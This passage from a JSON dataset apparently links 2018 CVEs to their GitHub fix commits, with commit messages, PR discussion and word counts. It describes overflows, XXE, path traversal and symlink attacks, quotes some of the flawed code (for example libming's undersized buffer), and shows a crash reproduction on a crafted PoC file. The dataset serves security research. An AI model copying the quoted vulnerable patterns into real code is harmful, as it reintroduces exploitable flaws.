            "commit_msg": "Fix buffer overflow in extract_status_code()\n\nIssue #960 identified that the buffer allocated for copying the\nHTTP status code could overflow if the http response was corrupted.\n\nThis commit changes the way the status code is read, avoids copying\ndata, and also ensures that the status code is three digits long,\nis non-negative and occurs on the first line of the response.\n\nSigned-off-by: Quentin Armitage <quentin@armitage.org.uk>",
            "commit_msg_words": 65,
            "other_info": "Fix buffer overflow in extract_status_code() This was assigned CVE-2018-19115. This issue has been fixed. Why NIST is refering to a NVD on this issue on 11/08 if this issue has been already fixed since 2.0.7. (the description is wrong : \"through 2.0.8\").\r\nIf you have the ability to close this CVE would you please help here ? Other CVE on follow links are open, and this issue is fixed too.\r\nregs, CVEs are used to track security issues. It doesn't matter if this has been fixed. I'll contact them and ask them to correct the version information",
            "pr_title_words": 5,
            "comments_words": 92,
            "total_other_info_words": 97
        },
        {
            "cve-id": "CVE-2018-1000820",
            "commit_url": "https://github.com/neo4j-contrib/neo4j-apoc-procedures/commit/45bc09c8bd7f17283e2a7e85ce3f02cb4be4fd1a",
            "commit_msg": "Fixes #931 (#962)",
            "commit_msg_words": 3,
            "other_info": "Fixes #931 XXE in Xml.java",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-12264",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/fe70939f54476e99046245ca69ff27012401f759",
            "commit_msg": "Fix addition overflows in range checks in LoaderTiff::getData\n\nSeveral checks for extracted values performed no overflow checks on the\naddition. They can be tricked into passing, albeit the individual summands are\ntoo large.\n=> use Safe::add() which now aborts when an overflow occurs\nThis fixes #366",
            "commit_msg_words": 46,
            "other_info": "Fix #365 and #366",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2018-8787",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/09b9d4f1994a674c4ec85b4947aa656eda1aed8a",
            "commit_msg": "Fixed CVE-2018-8787\n\nThanks to Eyal Itkin from Check Point Software Technologies.",
            "commit_msg_words": 11,
            "other_info": "Cve fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/3393/",
            "pr_title_words": 2,
            "comments_words": 14,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2018-20579",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/963c2d57aa63fa5421cf30698485bd4ba20e06aa",
            "commit_msg": "Json library: fix a number of potential buffer overflows",
            "commit_msg_words": 9,
            "other_info": "Json library: fix a number of potential buffer overflows If somebody has a nice code snippet they want to share on how to create and parse a JSON I'll be happy to add as an example and a CI test.\r\n\r\nUntil then I consider this PR ready.",
            "pr_title_words": 9,
            "comments_words": 38,
            "total_other_info_words": 47
        },
        {
            "cve-id": "CVE-2018-17974",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/af0398766558a868dca232238f5df9eb151de304",
            "commit_msg": "Bug #486 Enforce max snaplen rather than doing realloc\n\n* increase MAX_SNAPLEN from 65535 to 262144\n* increase MAXPACKET from 65549 to 262158\n* exit on buffer overflow for adding VLAN tag (as opposed to realloc)",
            "commit_msg_words": 36,
            "other_info": "Bug #486 CVE-2018-17974 realloc memory if packet size increases",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2018-12326",
            "commit_url": "https://github.com/redis/redis/commit/9fdcc15962f9ff4baebe6fdd947816f43f730d50",
            "commit_msg": "Security: fix redis-cli buffer overflow.\n\nThanks to Fakhri Zulkifli for reporting it.\n\nThe fix switched to dynamic allocation, copying the final prompt in the\nstatic buffer only at the end.",
            "commit_msg_words": 30,
            "other_info": "\u66f4\u65b0\u6570\u636e Indeed. Thank you very much, fixed in Git. Will release 1.2.3 in a few days at max.\n This is CVE-2018-12326.",
            "pr_title_words": 1,
            "comments_words": 20,
            "total_other_info_words": 21
        },
        {
            "cve-id": "CVE-2018-13785",
            "commit_url": "https://github.com/pnggroup/libpng/commit/8a05766cb74af05c04c53e6c9d60c13fc4d59bf2",
            "commit_msg": "[libpng16] Fix the calculation of row_factor in png_check_chunk_length\n\n(Bug report by Thuan Pham, SourceForge issue #278)",
            "commit_msg_words": 16,
            "other_info": "Bug fix + code cleanup You can still get a 0 with the following values:\r\n```c\r\npng_ptr->width = (size_t)-1;\r\npng_ptr->channels = 1;\r\npng_ptr->bit_depth = 1;\r\npng_ptr->interlaced = 0;\r\n``` ..so I suggest to add a sanitizing check here that row_factor > 0 before doing the division. The width cannot exceed PNG_UINT_31_MAX, so adding +1 here is safe.",
            "pr_title_words": 5,
            "comments_words": 52,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2018-11418",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/7c3f2bc8c7ed0c28a1ea097d7177363f8998a566",
            "commit_msg": "Fix heap buffer overflow in re_parse_char_class\n\nThis patch fixes #2230 and fixes #2237.\nTest cases are added for both issues and also adds new cases which caused the same error.\n\nJerryScript-DCO-1.0-Signed-off-by: Robert Fancsik frobert@inf.u-szeged.hu",
            "commit_msg_words": 34,
            "other_info": "Fix heap buffer overflow in re_parse_char_class @akosthekiss Thanks for the review, I've applied your suggestions.",
            "pr_title_words": 6,
            "comments_words": 9,
            "total_other_info_words": 15
        },
        {
            "cve-id": "CVE-2018-12544",
            "commit_url": "https://github.com/vert-x3/vertx-web/commit/26db16c7b32e655b489d1a71605f9a785f788e41",
            "commit_msg": "Added a test to verify XXE",
            "commit_msg_words": 6,
            "other_info": "Issues/1021",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2018-9165",
            "commit_url": "https://github.com/libming/libming/commit/358abc21a7cb9286288ab0812231da39e31144bb",
            "commit_msg": "Fix null pointer dereference in getName/getString\n\nWhenever getString or getName are called with an act such that act->p.String\nis a NULL pointer, a NULL pointer dereference might happen\n(strlen(act->p.string) is called).\n\nIn this commit we add checks at the beginning of the PUSH_STRING block so\nthat a warning is displayed and an empty string is returned in this case.\n\nThis patch fixes #121.",
            "commit_msg_words": 63,
            "other_info": "Fix null pointer dereference in getName/getString I have just added another commit addressing #116. snprintf returns number of characters that would have been printed\nout _excluding_ the terminating NULL so I think you'll want to\nincrement the return of it by 1 before assigning to \"needed_length\"\n Thanks Sandro for the feedback. I have pushed an updated patch which also handles the case where `snprintf` would return negative `needed_length` (error code). Not sure in which circumstances this might happen, but better check it. I have just pushed the changes to `pushdup`. See commit message for more information. This PR now fully adresses #121 and #116. Oh well, wait, looks like something is still going wrong.\r\n\r\nI'm going to push an updated version of this PR soon. It should be fine now. There is a fairly high amount of changes, so even if I already tested everything, a careful review would be nice.\r\n\r\nThanks ! Any chance you could look at re-introducing the now-broken\n\"make gen\" rule under test/ directory ?\n\nThe rule is still present in test/Makefile.inc but that Makefile\nis not included by test/Makefile.am. The \"make gen\" rule is\nreferenced by test/README and Makefile.inc itself has some\ninteresting comments/documentation.\n\nI'm thinking it could be useful to test all the changes you\nare doing in the decompiler.\n While I indeed think writing unit tests would be a very important step towards more stability in libming, this is most likely not something that I can do as part of my Debian LTS duties, and I don't have much spare time currently...\r\n\r\nIs there any bug report on this build system issue ? If I can get a precise description of the problem, I'll maybe check if can do something. But anyways, this is not something I'd do in this PR. Ok thanks, tests postponed Thanks !",
            "pr_title_words": 6,
            "comments_words": 298,
            "total_other_info_words": 304
        },
        {
            "cve-id": "CVE-2018-10887",
            "commit_url": "https://github.com/libgit2/libgit2/commit/3f461902dc1072acb8b7607ee65d0a0458ffac2a",
            "commit_msg": "delta: fix sign-extension of big left-shift\n\nOur delta code was originally adapted from JGit, which itself adapted it\nfrom git itself. Due to this heritage, we inherited a bug from git.git\nin how we compute the delta offset, which was fixed upstream in\n48fb7deb5 (Fix big left-shifts of unsigned char, 2009-06-17). As\nexplained by Linus:\n\n    Shifting 'unsigned char' or 'unsigned short' left can result in sign\n    extension errors, since the C integer promotion rules means that the\n    unsigned char/short will get implicitly promoted to a signed 'int' due to\n    the shift (or due to other operations).\n\n    This normally doesn't matter, but if you shift things up sufficiently, it\n    will now set the sign bit in 'int', and a subsequent cast to a bigger type\n    (eg 'long' or 'unsigned long') will now sign-extend the value despite the\n    original expression being unsigned.\n\n    One example of this would be something like\n\n            unsigned long size;\n            unsigned char c;\n\n            size += c << 24;\n\n    where despite all the variables being unsigned, 'c << 24' ends up being a\n    signed entity, and will get sign-extended when then doing the addition in\n    an 'unsigned long' type.\n\n    Since git uses 'unsigned char' pointers extensively, we actually have this\n    bug in a couple of places.\n\nIn our delta code, we inherited such a bogus shift when computing the\noffset at which the delta base is to be found. Due to the sign extension\nwe can end up with an offset where all the bits are set. This can allow\nan arbitrary memory read, as the addition in `base_len < off + len` can\nnow overflow if `off` has all its bits set.\n\nFix the issue by casting the result of `*delta++ << 24UL` to an unsigned\ninteger again. Add a test with a crafted delta that would actually\nsucceed with an out-of-bounds read in case where the cast wouldn't\nexist.\n\nReported-by: Riccardo Schirone <rschiron@redhat.com>\nTest-provided-by: Riccardo Schirone <rschiron@redhat.com>",
            "commit_msg_words": 319,
            "other_info": "Release v0.27.3",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2018-20552",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/6b830a1640ca20528032c89a4fdd8291a4d2d8b2",
            "commit_msg": "Bug #520 Fix heap overflow on zero or 0xFFFF packet length\n\nAdd check for packets that report zero packet length. Example\nof fix:\n\n    src/tcpprep --auto=bridge --pcap=poc16-get_l2len-heapoverflow --cachefile=/dev/null\n    Warning: poc16-get_l2len-heapoverflow was captured using a snaplen of 17 bytes.  This may mean you have truncated packets.\n    safe_pcap_next ERROR: Invalid packet length in tcpprep.c:process_raw_packets() line 334: packet length=0 capture length=0",
            "commit_msg_words": 57,
            "other_info": "Bug #530 Fix heap overflow on zero or 0xFFFF packet length",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2018-11226",
            "commit_url": "https://github.com/libming/libming/commit/6e5a28dc0419e5c6681292db40cbd996fadf9213",
            "commit_msg": "decompile: introduce new method Offset\n\nThe getString method in decompile.c is vulnerable to a buffer\noverflow which can be triggered using a crafted SWF file.\n\nThis vulnerability is the consequence of unchecked accesses to the\nactions array when getting the offset of SWF_ACTIONRECORD objects.\n\nThis pattern is present a bit everywhere in the source code, leading\nto a large number of potential flaws similar to this one. In this\ncommit we introduce a new Offset method similar to the OpCode method\nwhich handles bound checking when retrieving the offset of\nSWF_ACTIONRECORD objects.\n\nThis commit also modifies getString to use this newly introduced\nmethod and address the previously explained bug.\n\nUsage of the newly introduced Offset method will be generalized in a\nfuture commit.\n\nPlease, note that this commit won't be sufficient to fix #144\n(CVE-2018-11226) since another issue is triggered by the same sample.",
            "commit_msg_words": 144,
            "other_info": "decompile: fix various security issues (By the way, thanks for adding me to the group, but even if I have the permissions to merge now I still consider it essential to get an external review before getting any line of code into the master) Just noticed some NEWS entries are missing. Will be fixed soon. Do you want to include an entry for merged PR #138 since you're at it ? Thanks for the great work guys!\r\n\r\nwell.. i have some doubts, with the death of the flash, this library still be useful?\r\n\r\nin other words, AS3 is supported? @hlef how about fixing those NEWS entries so we merge this ?\r\n@Guardian820 Ming does not support AS3",
            "pr_title_words": 5,
            "comments_words": 112,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2018-7867",
            "commit_url": "https://github.com/libming/libming/commit/30170828f1e8e4dff95af6e319b4ad59e64796d9",
            "commit_msg": "Fix heap-buffer-overflow in getString\n\ngetString is allocating a 4-bytes buffer to store an 'R' and an\n8-bit number.\n\nt=malloc(4); /* Rdd */\nsprintf(t,\"R%d\", act->p.RegisterNumber );\nreturn t;\n\nSince up to three digits can be required to store the 8-bit\nnumber, the buffer has to be 5 bytes long.\n\nIn this commit we also fix the PUSH_DOUBLE case by dynamically\ncomputing the required buffer size.\n\nThis commit fixes #116 (CVE-2018-7867).",
            "commit_msg_words": 69,
            "other_info": "Fix null pointer dereference in getName/getString I have just added another commit addressing #116. snprintf returns number of characters that would have been printed\nout _excluding_ the terminating NULL so I think you'll want to\nincrement the return of it by 1 before assigning to \"needed_length\"\n Thanks Sandro for the feedback. I have pushed an updated patch which also handles the case where `snprintf` would return negative `needed_length` (error code). Not sure in which circumstances this might happen, but better check it. I have just pushed the changes to `pushdup`. See commit message for more information. This PR now fully adresses #121 and #116. Oh well, wait, looks like something is still going wrong.\r\n\r\nI'm going to push an updated version of this PR soon. It should be fine now. There is a fairly high amount of changes, so even if I already tested everything, a careful review would be nice.\r\n\r\nThanks ! Any chance you could look at re-introducing the now-broken\n\"make gen\" rule under test/ directory ?\n\nThe rule is still present in test/Makefile.inc but that Makefile\nis not included by test/Makefile.am. The \"make gen\" rule is\nreferenced by test/README and Makefile.inc itself has some\ninteresting comments/documentation.\n\nI'm thinking it could be useful to test all the changes you\nare doing in the decompiler.\n While I indeed think writing unit tests would be a very important step towards more stability in libming, this is most likely not something that I can do as part of my Debian LTS duties, and I don't have much spare time currently...\r\n\r\nIs there any bug report on this build system issue ? If I can get a precise description of the problem, I'll maybe check if can do something. But anyways, this is not something I'd do in this PR. Ok thanks, tests postponed Thanks !",
            "pr_title_words": 6,
            "comments_words": 298,
            "total_other_info_words": 304
        },
        {
            "cve-id": "CVE-2018-6358",
            "commit_url": "https://github.com/libming/libming/commit/03498cf4e0319d8836aba96ce8a817beaabb441e",
            "commit_msg": "Fix various compiler warnings.\n\nRemove useless variables blockstart, blockoffset and here.",
            "commit_msg_words": 11,
            "other_info": "Fix several issues in listfdb and some compiler warnings Thanks, merged with c4d20b127bac8cfd13fc7a965f3ffdf3d59e5793",
            "pr_title_words": 9,
            "comments_words": 4,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2018-19859",
            "commit_url": "https://github.com/OpenRefine/OpenRefine/commit/79994e86da1a3eecc62723f4ba90f14a63ad0e72",
            "commit_msg": "Create dedicated temporary dir for zip slip test",
            "commit_msg_words": 8,
            "other_info": "Fix zip slip vulnerability",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2018-19044",
            "commit_url": "https://github.com/acassen/keepalived/commit/04f2d32871bb3b11d7dc024039952f2fe2750306",
            "commit_msg": "When opening files for write, ensure they aren't symbolic links\n\nIssue #1048 identified that if, for example, a non privileged user\ncreated a symbolic link from /etc/keepalvied.data to /etc/passwd,\nwriting to /etc/keepalived.data (which could be invoked via DBus)\nwould cause /etc/passwd to be overwritten.\n\nThis commit stops keepalived writing to pathnames where the ultimate\ncomponent is a symbolic link, by setting O_NOFOLLOW whenever opening\na file for writing.\n\nThis might break some setups, where, for example, /etc/keepalived.data\nwas a symbolic link to /home/fred/keepalived.data. If this was the case,\ninstead create a symbolic link from /home/fred/keepalived.data to\n/tmp/keepalived.data, so that the file is still accessible via\n/home/fred/keepalived.data.\n\nThere doesn't appear to be a way around this backward incompatibility,\nsince even checking if the pathname is a symbolic link prior to opening\nfor writing would create a race condition.\n\nSigned-off-by: Quentin Armitage <quentin@armitage.org.uk>",
            "commit_msg_words": 141,
            "other_info": "Allow limiting file access permissions for created files, and don't allow overwriting of systems files via symbolic links",
            "pr_title_words": 18,
            "comments_words": 0,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2018-11380",
            "commit_url": "https://github.com/radareorg/radare2/commit/60208765887f5f008b3b9a883f3addc8bdb9c134",
            "commit_msg": "Fix #9970 - heap oobread in mach0 parser (#10026)",
            "commit_msg_words": 9,
            "other_info": "Fix #9970 - heap oobread in mach0 parser",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2018-20847",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/c58df149900df862806d0e892859b41115875845",
            "commit_msg": "[OPENJP2] change the way to compute *p_tx0, *p_tx1, *p_ty0, *p_ty1 in function\nopj_get_encoding_parameters\n\nSigned-off-by: Young_X <YangX92@hotmail.com>",
            "commit_msg_words": 16,
            "other_info": "Fix multiple potential vulnerabilities and bugs Ping > @Young-X I had to revert that commit in e1740e7 since it didn't compile. I'm disappointed you submit commits that don't even compile...\r\n\r\n@rouault it seems commit https://github.com/uclouvain/openjpeg/commit/e1740e7ce79d0a1676db4da0f4189b64e85f52cb was supposed to fix CVE-2018-20846, which is about out-of-bound accesses in pi_next_lrcp, pi_next_rlcp, pi_next_rpcl, pi_next_pcrl, pi_next_rpcl, and pi_next_cprl . With that commit reverted, is there a patch for that CVE? Thanks. > is there a patch for that CVE?\r\n\r\nno",
            "pr_title_words": 6,
            "comments_words": 69,
            "total_other_info_words": 75
        },
        {
            "cve-id": "CVE-2018-20157",
            "commit_url": "https://github.com/OpenRefine/OpenRefine/commit/6a0d7d56e4ffb420316ce7849fde881344fbf881",
            "commit_msg": "Disable DTDs in XML importer. Closes #1907.",
            "commit_msg_words": 7,
            "other_info": "Disable DTDs in XML importer.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-15836",
            "commit_url": "https://github.com/xelerance/Openswan/commit/9eaa6c2a823c1d2b58913506a15f9474bf857a3d",
            "commit_msg": "wo#7449 . verify padding contents for IKEv2 RSA sig check\n\nSpecial thanks to Sze Yiu Chau of Purdue University (schau@purdue.edu)\nwho reported the issue.",
            "commit_msg_words": 24,
            "other_info": "T7449 rsa padding attack (2.6.50) take 5",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2018-1000652",
            "commit_url": "https://github.com/JabRef/jabref/commit/89f855d76713b4cd25ac0830c719cd61c511851e",
            "commit_msg": "Fix importer vulnerability (#4240)\n\n* Fix importer vulnerability\r\nFixed issue #4229  where importer was vulnerable to XXE attacks by\r\ndisabling DTDs along with adding warning to logger if features are\r\nunavailable. fixes #4229\r\n\r\n* Fix minor code errors and logger optimization\r\nRemoved author line in class comment. Reworded CHANGLOG.md. Set\r\nDTD features to individual final static constants. Optimized\r\nlogger by parameterizing feature and error.\r\n\r\n* Rearrange import statments for project compatibility\r\n\r\n* Remove merge artefacts from changelog",
            "commit_msg_words": 77,
            "other_info": "Fix importer vulnerability Thanks for your contribution\r\nI just resolved the conflict in the changelog, so that the build runs on Travis. Check the Continous Interation Travis output (just click on it, in case it fails)  Thanks for the feedback. Yes, I agree with all of the fixes. Sorry about the two commits back to back. The first one stated it did not go through on my end as I needed to update HEAD. Also, I am not sure why I am failing both tests. the CI test seems to be related to GUI errors while the Codacy fail is from the extra space before importing items from slf4j. The Travis CI log raises a check style issue, so just some code formatting and the wrong import order. Although it might seem annoying, but it serves the purpose to have consistent code style and to avoid unnecessary conflicts between files \r\n\r\n Both for intellij and Eclipse we provide the correct code format layout. In Eclipse hit ctrl + f to format and ctrl + o for the import order fix  No I agree. The project should be uniform in import and code style as it would look a mess without. Pushed the changes.",
            "pr_title_words": 3,
            "comments_words": 199,
            "total_other_info_words": 202
        },
        {
            "cve-id": "CVE-2018-8098",
            "commit_url": "https://github.com/libgit2/libgit2/commit/3db1af1f370295ad5355b8f64b865a2a357bcac0",
            "commit_msg": "index: error out on unreasonable prefix-compressed path lengths\n\nWhen computing the complete path length from the encoded\nprefix-compressed path, we end up just allocating the complete path\nwithout ever checking what the encoded path length actually is. This can\neasily lead to a denial of service by just encoding an unreasonable long\npath name inside of the index. Git already enforces a maximum path\nlength of 4096 bytes. As we also have that enforcement ready in some\nplaces, just make sure that the resulting path is smaller than\nGIT_PATH_MAX.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in>\nReported-by: Vivek Parikh <viv0411.parikh@gmail.com>",
            "commit_msg_words": 99,
            "other_info": "Index parsing fixes",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2018-17582",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/6d2fd968d8d520283b96986945a1b91c8a60131b",
            "commit_msg": "Bug #486 CVE-2018-17974 realloc memory if packet size increases (#492)\n\n* Bug #486 CVE-2018-17974 realloc memory if packet size increases\r\n\r\nAlso added check for packet size > cap len, although this may\r\nbe never be hit since #484\r\n\r\n* Bug #486 Enforce max snaplen rather than doing realloc\r\n\r\n* increase MAX_SNAPLEN from 65535 to 262144\r\n* increase MAXPACKET from 65549 to 262158\r\n* exit on buffer overflow for adding VLAN tag (as opposed to realloc)",
            "commit_msg_words": 75,
            "other_info": "Bug #486 CVE-2018-17974 realloc memory if packet size increases",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2018-20458",
            "commit_url": "https://github.com/radareorg/radare2/commit/30f4c7b52a4e2dc0d0b1bae487d90f5437c69d19",
            "commit_msg": "Fix #12374 - oobread crash in truncated dyldcache ##bin (#12381)",
            "commit_msg_words": 10,
            "other_info": "Fix dyldcache oob",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2018-16336",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/35b3e596edacd2437c2c5d3dd2b5c9502626163d",
            "commit_msg": "Add overflow & overread checks to PngChunk::parseTXTChunk()\n\nThis function was creating a lot of new pointers and strings without\nproperly checking the array bounds. This commit adds several calls\nto enforce(), making sure that the pointers stay within bounds.\nStrings are now created using the helper function\nstring_from_unterminated() to prevent overreads in the constructor of\nstd::string.\n\nThis fixes #400",
            "commit_msg_words": 59,
            "other_info": "Fix issue #400 # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=h1) Report\n> Merging [#407](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/2540981aae263236b39f5a59fbe189c4fbb33731?src=pr&el=desc) will **increase** coverage by `0.01%`.\n> The diff coverage is `100%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/407/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master     #407      +/-   ##\n==========================================\n+ Coverage   53.92%   53.94%   +0.01%     \n==========================================\n  Files         173      173              \n  Lines       26635    26643       +8     \n==========================================\n+ Hits        14364    14372       +8     \n  Misses      12271    12271\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/helper\\_functions.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/407/diff?src=pr&el=tree#diff-c3JjL2hlbHBlcl9mdW5jdGlvbnMuY3Bw) | `100% <100%> (\u00f8)` | :arrow_up: |\n| [src/pngchunk\\_int.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/407/diff?src=pr&el=tree#diff-c3JjL3BuZ2NodW5rX2ludC5jcHA=) | `85.08% <100%> (+0.56%)` | :arrow_up: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=footer). Last update [2540981...dadd1d1](https://codecov.io/gh/Exiv2/exiv2/pull/407?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 3,
            "comments_words": 125,
            "total_other_info_words": 128
        },
        {
            "cve-id": "CVE-2018-15858",
            "commit_url": "https://github.com/xkbcommon/libxkbcommon/commit/badb428e63387140720f22486b3acbd3d738859f",
            "commit_msg": "keycodes: don't try to copy zero key aliases\n\nMove the aliases copy to within the (num_key_aliases > 0) block.\n\nPassing info->aliases into this fuction with invalid aliases will\ncause log messages but num_key_aliases stays on 0. The key_aliases array\nis never allocated and remains NULL. We then loop through the aliases, causing\na null-pointer dereference.\n\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>",
            "commit_msg_words": 59,
            "other_info": "Coverity fixes (one real bug) Force-pushed, now with just a comment for coverity's sake. Thanks! I think I'll release 0.8.1 this weekend. CVE-2018-15858.",
            "pr_title_words": 5,
            "comments_words": 18,
            "total_other_info_words": 23
        },
        {
            "cve-id": "CVE-2018-19417",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/3b5369cf2a1851a062510e21261e0904704aebba",
            "commit_msg": "MQTT parse_publish_vhdr: added missing initialization of topic_pos",
            "commit_msg_words": 7,
            "other_info": "MQTT buffer overflow fix BTW we're missing an MQTT CI test aren't we? > BTW we're missing an MQTT CI test aren't we?\r\n\r\nYou mean actual execution, yes? > > BTW we're missing an MQTT CI test aren't we?\r\n> \r\n> You mean actual execution, yes?\r\n\r\nYes not just compilation Yeah I don't think we have one (I certainly haven't written one!). Should be very easy to knock together using native and mosquitto. That would be great yes, based on `/tests/Makefile.script-test`",
            "pr_title_words": 4,
            "comments_words": 77,
            "total_other_info_words": 81
        },
        {
            "cve-id": "CVE-2018-7225",
            "commit_url": "https://github.com/LibVNC/libvncserver/commit/28afb6c537dc82ba04d5f245b15ca7205c6dbb9c",
            "commit_msg": "Limit client cut text length to 1 MB\n\nThis patch constrains a client cut text length to 1 MB. Otherwise\na client could make server allocate 2 GB of memory and that seems to\nbe to much to classify it as a denial of service.\n\nThe limit also prevents from an integer overflow followed by copying\nan uninitilized memory when processing msg.cct.length value larger\nthan SIZE_MAX or INT_MAX - sz_rfbClientCutTextMsg.\n\nThis patch also corrects accepting length value of zero (malloc(0) is\ninterpreted on differnet systems differently).\n\nCVE-2018-7225\n<https://github.com/LibVNC/libvncserver/issues/218>",
            "commit_msg_words": 88,
            "other_info": "Validate client cut text length I added a second patch that limits the client cut length to 1 MB as it looks reasonable. Then I rebased them to the latest upstream master HEAD. Thanks! I'll have a look ASAP Also, please update the PR to contain a single commit. On Thu, Mar 08, 2018 at 11:06:32AM -0800, Christian Beier wrote:\n> bk138 requested changes on this pull request.\n> \n> Almost there! It also seems to me that the 2nd paragraph in the commit log is obsolete?\n>\nIt's required. This fix is about CVE-2018-7225.\n\n> > @@ -2575,7 +2577,23 @@ rfbProcessClientNormalMessage(rfbClientPtr cl)\n>  \n>  \tmsg.cct.length = Swap32IfLE(msg.cct.length);\n>  \n> -\tstr = (char *)malloc(msg.cct.length);\n> +\t/* uint32_t input is passed to malloc()'s size_t argument,\n> +\t * to rfbReadExact()'s int argument, to rfbStatRecordMessageRcvd()'s int\n> +\t * argument increased of sz_rfbClientCutTextMsg, and to setXCutText()'s int\n> +\t * argument. Here we impose a limit of 1 MB so that the value fits\n> +\t * into all of the types to prevent from misinterpretation and thus\n> +\t * from accessing uninitialized memory (CVE-2018-7225) and also to\n> +\t * prevent from a denial-of-service by allocating to much memory in\n> +\t * the server. */\n> +\tif (msg.cct.length > 1<<20) {\n> +\t    rfbLog(\"rfbClientCutText: too big cut text length requested: %\" PRIu32 \"\\n\",\n> \n> Why not simply use %u here?\n> \nBecause msg.cct.length is not of type unsigned int.",
            "pr_title_words": 5,
            "comments_words": 239,
            "total_other_info_words": 244
        },
        {
            "cve-id": "CVE-2018-7873",
            "commit_url": "https://github.com/libming/libming/commit/efc75c28e89fe864cf0412d5a5f0b4a451e14509",
            "commit_msg": "decompile: fix buffer-overflow in getString\n\ngetString prints a 32 bit integer to a 10 char buffer, but the number\nitself has 10 digits so there's an overflow.\n\nSimilar to #116, same fix.\n\nFixes #111, CVE-2018-7873.",
            "commit_msg_words": 35,
            "other_info": "decompile: fix various security issues (By the way, thanks for adding me to the group, but even if I have the permissions to merge now I still consider it essential to get an external review before getting any line of code into the master) Just noticed some NEWS entries are missing. Will be fixed soon. Do you want to include an entry for merged PR #138 since you're at it ? Thanks for the great work guys!\r\n\r\nwell.. i have some doubts, with the death of the flash, this library still be useful?\r\n\r\nin other words, AS3 is supported? @hlef how about fixing those NEWS entries so we merge this ?\r\n@Guardian820 Ming does not support AS3",
            "pr_title_words": 5,
            "comments_words": 112,
            "total_other_info_words": 117
        },
        {
            "cve-id": "CVE-2018-1000850",
            "commit_url": "https://github.com/square/retrofit/commit/b9a7f6ad72073ddd40254c0058710e87a073047d",
            "commit_msg": "Forbid path traversal ('.' and '..') as @Path parameters.\n\nThey're likely to have the unintended effect. For example, passing \"..\"\nto @DELETE /account/book/{isbn}/ yields @DELETE /account/.",
            "commit_msg_words": 26,
            "other_info": "Forbid path traversal ('.' and '..') as @Path parameters.",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2018-9988",
            "commit_url": "https://github.com/Mbed-TLS/mbedtls/commit/a1098f81c252b317ad34ea978aea2bc47760b215",
            "commit_msg": "Add bounds check before signature length read",
            "commit_msg_words": 7,
            "other_info": "IOTSSL-1879 buffer overflow in server key exchange parsing I have just noticed the verification build failure. I will investigate it. CI passed except for the FreeBSD timing self-test which is a known issue. Can you please add a ChangeLog entry, and make backports to 2.1 and 2.7? retest retest",
            "pr_title_words": 8,
            "comments_words": 41,
            "total_other_info_words": 49
        },
        {
            "cve-id": "CVE-2018-20742",
            "commit_url": "https://github.com/mc2-project/opaque-sql/commit/5ddda15d89f5ac82f4416208c5319ace4aecdc36",
